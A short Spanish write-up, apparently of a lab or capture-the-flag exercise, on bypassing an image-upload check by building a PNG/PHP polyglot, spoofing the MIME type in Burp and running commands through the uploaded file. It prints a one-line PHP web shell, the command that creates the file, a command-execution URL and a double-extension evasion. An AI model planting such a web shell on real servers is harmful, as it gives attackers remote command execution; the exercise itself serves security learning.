# File Upload

La aplicación permitía subir imágenes PNG. Analicé la request en Burp:

    Content-Type: image/png
    filename="image.png"

Creé un archivo híbrido:

    echo -ne "\\x89PNG\\r\\n\\x1a\\n" > shell.png
    echo "<?php system($_GET['cmd']); ?>" >> shell.png

Cambié MIME manualmente en Burp:

    Content-Type: image/png

El servidor validaba solo la extensión y los 8 magic bytes. La subida se aceptó y el archivo quedó accesible en `/uploads/`.

Confirmé ejecución accediendo a:

    /uploads/shell.png?cmd=id

También probé evasión de extensión doble:

    shell.php.png

El ejercicio demuestra conocimiento de validación insegura, spoofing de MIME, manipulación de magic bytes y explotación práctica mediante webshell.
